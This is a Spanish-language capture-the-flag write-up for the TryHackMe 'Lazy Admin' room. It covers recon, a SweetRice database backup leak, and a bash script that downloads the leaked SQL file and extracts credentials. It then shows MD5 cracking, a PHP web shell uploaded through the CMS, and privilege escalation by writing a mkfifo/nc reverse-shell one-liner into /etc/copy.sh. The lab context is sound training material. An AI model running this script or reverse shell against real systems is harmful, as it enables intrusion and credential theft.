---
title : MQ|Lazy dmin|THM|EC|SUID
published : True
---

<div class="contenedor imgc">
    <img class="imgc" src="imgs/lazyAdmin/lazyAdmin.png" style="width: 169px" alt="Cheese logo">
    <div> 
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Fácil </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://tryhackme.com/room/lazyadmin" style="color: lightblue;">Lazy Admin</a></p>
    </div>
</div>

<h2><font color="white"><center># LazyAdmin</center></font></h2>
* <p>Empezamos con el reconocimiento de la maquina</p>
> ping -c 1 IP
<img src="/imgs/lazyAdmin/lazyAdmin0.jpg"/>
<br>
<br>
`Vemos que es una maquina Linux por el ttl que es de 63, por proximidad hacia 64 podemos decir que la maquina es Linux.`
* <p>Empezamos con el reconocimiento de puertos.</p>
> nmap --min-rate 5000 -sV -sS -Pn --open 10.10.56.176 -o ports
<img src="/imgs/lazyAdmin/lazyAdmin1.jpg"/>
<br>
<br>
`Podemos observar que tiene el puerto ssh y http abierto.`
* <p>Ahora enumeraremos los directorios activos de la pagina web</p>
> wfuzz -t 200 --hc=404 -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.56.176/FUZZ
<img src="/imgs/lazyAdmin/lazyAdmin2.jpg"/>
<br>
<br>
`Vemos que hay un directorio llamado content.`

* <p>Miremos que trae ese directorio.</p>

<img src="/imgs/lazyAdmin/lazyAdmin3.jpg"/>
<br>
`Vemos que en su sistema usa SweetRice el cual miraremos si tiene vulnerabilidades.`

<br>
* <p>Miremos si tiene vulnerabilidades el sistema que tiene en uso.</p>
> searchsploit sweetrice
<img src="/imgs/lazyAdmin/lazyAdmin4.jpg"/>
* <p>Mirando bien tenemos un exploit llamado Backup Disclosure que recopila información, de una base de datos mySql.</p>

<img src="/imgs/lazyAdmin/lazyAdmin5.jpg"/>
<br><br>
`Lo que podemos observe es que hay una base de datos filtrada en una url en este caso http://localhost/inc/mysql_backup`
* Veamos si existe el archivo filtrado.

<img src="/imgs/lazyAdmin/lazyAdmin6.jpg"/>
<br><br>
`Ahora si vemos el archivo descargado podemos ver que hay un usuario llamado "manager" y la contraseña encriptada en MD5`
* <p>Por cierto pensé en la gente y desarrolle este <font color="red">exploit</font> el cual te automatiza todo.</p>


```bash
#!/bin/bash

ctrl_c(){
	echo -e "[\e[31;1m!\e[0m] Saliendo\n"
	exit 2
}
trap ctrl_c INT

function init(){
	echo -e "\e[31;1m[!] Cheking if exist url : $1\e[0m"

	if test """$( curl -s -X GET "http://$1/content/inc/mysql_backup/" -i | head -n 1 | cut -f2 -d' ' )""" -eq 200;then
		echo -e "\e[37;1m [+] Succes url database...\e[0m"
		echo -e "\e[37;1m [!] Cheking database exist into url\e[0m"
		curl -s -X GET "http://$1/content/inc/mysql_backup/" | tr '>' '\n' | grep -E '".*?"' | grep "href" | grep -E "*.sql" | cut -f2 -d'"' > .nameFile.tmp
		echo -e "\e[37;1m [+] Name succes... \e[0m"
		echo -e "\e[37;1m [!] Extracting file db\e[0m"
		curl -s -X GET "http://$1/content/inc/mysql_backup/$(cat .nameFile.tmp)" > database.sql
		echo -e "\e[37;1m [+] Ok data base extract in file -->> database.sql\e[0m"
		echo -e "\e[37;1m [!] Extracting users and passwords of file\e[0m"
		echo -e "\n\e[37;1m[ Credentials ]"
		echo -e "\e[37;1m------------------------"
		cat database.sql  | tr ':' '\n' | grep 'passwd' -A2 -B3 | tr -d '\\' | grep -E '".*?"' | grep -vE "pass*" > .credentials.tmp
		echo -e "Username : $(cat .credentials.tmp | head -n 1)"
		echo -e """password : $(cat .credentials.tmp | head -n 2 | awk "NR==2")"""
		echo -e "-----------------------------"
		echo -e "\n[ all information ]"
		echo -e "--------------------------"
		cat .credentials.tmp
		echo -e "------------------------\n"
		echo -e "if there a error check file database.sql for verify."
		echo '' 
		rm -rf .nameFile.tmp
		exit 0
		
		
	else
		if test """$(curl -s -X GET "http://$1/inc/mysql_backup/" -e | head -n 1 | cut -f2 -d' ')""" -eq 200; then
			echo -e "\e[37;1m Succes url database \e[0m"
			echo -e "\e[37;1m Cheking database into url\e[0m"
			curl -s -X GET "http://$1/content/inc/mysql_backup/" | tr '>' '\n' | grep -E '".*?"' | grep "href" | grep -E "*.sql" | cut -f2 -d'"' > .nameFile.tmp
			echo -e "\e[37;1m [+] Name succes... \e[0m"
  	 	        echo -e "\e[37;1m [!] Extracting file db\e[0m"
			curl -s -X GET "http://$1/inc/mysql_backup/$(cat .nameFile.tmp)" > database2.sql
			echo -e "\e[37;1m [!] Extracting users and passwords of file\e[0m"
			echo -e "[ Credentials ]"
			echo -e "\e[37;1m------------------------"
	               	cat database.sql  | tr ':' '\n' | grep 'passwd' -A2 -B3 | tr -d '\\' | grep -E '".*?"' | grep -vE "pass*"
        	        echo -e "------------------------"
	                echo -e "if there a error check file database.sql for verify."
			rm -rf .nameFile.tmp
			exit 0
		else
			echo -e "\e[37;1m Error exploit\e[0m"
		fi
	fi
	
	
}

if test -z $1;then
	echo -e "\e[31;1m Not url declare\e[0m"
	exit 5
fi
init $1


```
* <p>Si lo ejecutamos...</p>

<img src="/imgs/lazyAdmin/lazyAdmin7.jpg"/>
<br><br>
`Vemos el usuario y la contraseña.`
* <p>Ahora desencriptar el hash anteriormente.</p>
> john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

<img src="/imgs/lazyAdmin/lazyAdmin8.jpg"/>
<br><br>
`contraseña débil.`
* <p>Ahora ya podemos ingresar al login de la pagina web.</p>

<img src="/imgs/lazyAdmin/lazyAdmin9.jpg"/>
* <p>Ahora nos vamos al apartado de anuncios.</p>

<img src="/imgs/lazyAdmin/lazyAdmin10.jpg"/>
* <p>Ahora solo colocamos un codigo php que me de una web Shell. </p>

<img src="/imgs/lazyAdmin/lazyAdmin11.jpg"/>
* <p>Ahora vamos a la url, donde se cargo el archivo php en este caso es en  <font color="yellow">http://localhost/content/inc/ads/( nombre de archivo).php</font></p>

<img src="/imgs/lazyAdmin/lazyAdmin12.jpg"/>
* <p>Nos ponemos en escucha en nuestra terminal y recargamos la pagina web anterior, de esta forma ganaremos una web Shell</p>

<img src="/imgs/lazyAdmin/lazyAdmin13.jpg"/>
* <p>Enumeramos el sistema para ver como podemos escalar privilegios.</p>

<img src="/imgs/lazyAdmin/lazyAdmin14.jpg"/>
<br><br>
`En la imagen podemos ver que tenemos permisos para ejecutar perl, un archivo llamado /home/itguy/backuo.pl que a su vez ejecuta otro archivo llamado /etc/copy.sh el cual vemos que tenemos permisos de escritura`
* Como el archivo /etc/copy.sh, en su contexto vemos que el archivo tiene una estructura para lanzar una seudo consola por una ip y un puerto, lo que haré sera remplazar la ip y el puerto y ejecutar el archivo.
> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TuIp 5555 >/tmp/f"  > /etc/copy.sh
<img src="/imgs/lazyAdmin/lazyAdmin15.jpg"/>



